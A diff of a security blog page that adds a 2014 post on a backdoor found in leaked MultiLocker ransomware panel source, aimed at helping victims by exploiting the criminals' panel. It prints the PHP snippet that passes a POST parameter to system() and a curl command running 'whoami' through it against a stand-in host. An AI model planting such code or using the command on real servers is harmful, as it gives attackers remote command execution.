@@ -9,13 +9,13 @@
   <head>
     <meta charset="utf-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
-    <title>Botnet Analysis - bwall - Brian Wallace</title>
+    <title>MultiLocker Backdoor - bwall - Brian Wallace</title>
     <meta name="author" content="Brian Wallace">
     
     <meta name="description" content="Blog dedicated to security, coding and botnets">
     
     <meta name="viewport" content="width=device-width">
-    <link rel="canonical" href="https://bwall.github.io/malware/botnets">
+    <link rel="canonical" href="https://bwall.github.io/blog/2014/03/09/multilocker-backdoor">
     
     <link href="/favicon.png" rel="icon">
     <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet">
@@ -59,14 +59,87 @@
         <div class="grid__item two-thirds lap-one-whole palm-one-whole">
         
 
-          
-<h1 class="title indent">
-  Botnet Analysis
-</h1>
-<hr class="divider">
+          <article class="post">
+  <header>
+  
+  <h1 class="title indent">MultiLocker Backdoor</h1>
+  
+
+  
+  <div class="meta clearfix">
+    
 
 
-<p>Nothing here yet, check back later when I have time to write more down.</p>
+
+
+
+
+
+
+  
+
+
+<time class="pull-left" datetime="2014-03-09T17:28:07-07:00" pubdate data-updated="true"><i class="icon-calendar"></i> Mar 9<span>th</span>, 2014</time>
+    
+
+  <div class="pull-left">
+    <i class="icon-tags"></i>
+    <ul class="tags unstyled">
+    
+      
+        <li><a class='category' href='/blog/categories/backdoor/'>backdoor</a></li>
+      
+        <li><a class='category' href='/blog/categories/botnet/'>botnet</a></li>
+      
+        <li><a class='category' href='/blog/categories/exploit/'>exploit</a></li>
+      
+        <li><a class='category' href='/blog/categories/multilocker/'>multilocker</a></li>
+      
+        <li><a class='category' href='/blog/categories/vulnerability/'>vulnerability</a></li>
+      
+    
+    </ul>
+  </div>
+
+    
+  </div>
+  
+</header>
+
+
+
+
+  <p>In a recent search through some underground communities, I came across the source code to a version of the MultiLocker panel.  With ransomware, the security industry is always looking for a good way to resolve the issue without the ransom being paid.  This could potentially be done by gathering information from the botnet&rsquo;s panel.</p>
+
+<!-- more -->
+
+
+<p>While there are likely other vulnerabilities, this one stood out after a quick grep of the code.  In the &lsquo;lending/PL.php&rsquo;, there is some obvious backdoor code.</p>
+
+<figure class='code'><figcaption><span>MultiLocker Backdoor code </span></figcaption>
+<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">]))</span>
+</span><span class='line'><span class="p">{</span>
+</span><span class='line'><span class="nb">system</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">]);</span>
+</span><span class='line'><span class="k">die</span><span class="p">();</span>
+</span><span class='line'><span class="p">}</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>This can easily be accessed with curl or wget (let&rsquo;s assume <a href="http://c2.panel/">http://c2.panel/</a> is the MultiLocker panel root).</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>curl -v -d "c=whoami" http://c2.panel/lending/PL.php</span></code></pre></td></tr></table></div></figure>
+
+
+<p>For more information on MultiLocker, you can check out a great blog post on it <a href="http://www.xylibox.com/2012/11/multi-locker.html">here</a>.</p>
+
+
+</article>
 
 
 
